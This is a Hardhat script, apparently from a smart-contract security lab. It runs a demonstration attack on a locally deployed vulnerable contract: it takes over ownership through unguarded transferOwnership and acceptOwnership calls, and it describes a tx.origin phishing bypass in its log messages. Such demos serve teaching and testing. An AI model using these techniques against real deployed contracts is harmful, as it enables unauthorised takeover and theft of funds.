const hre = require("hardhat");

async function main() {
    const [attacker, victim] = await hre.ethers.getSigners();
    console.log("[+] Access Control Attack initiated");

    const deployments = require("../deployments.json");
    const access = await hre.ethers.getContractAt("AccessControlAttack", deployments.AccessControlAttack);

    console.log("[i] Attempting ownership seizure...");
    await access.connect(attacker).transferOwnership(attacker.address);
    await access.connect(attacker).acceptOwnership();
    const newOwner = await access.owner();
    console.log("[✓] Ownership seized:", newOwner);

    console.log("[i] tx.origin phishing setup...");
    console.log("    Attacker deploys malicious contract that calls sensitiveAction()");
    console.log("    When owner interacts with malicious contract, tx.origin == owner");
    console.log("    Bypasses msg.sender check!");
}

main().catch(console.error);
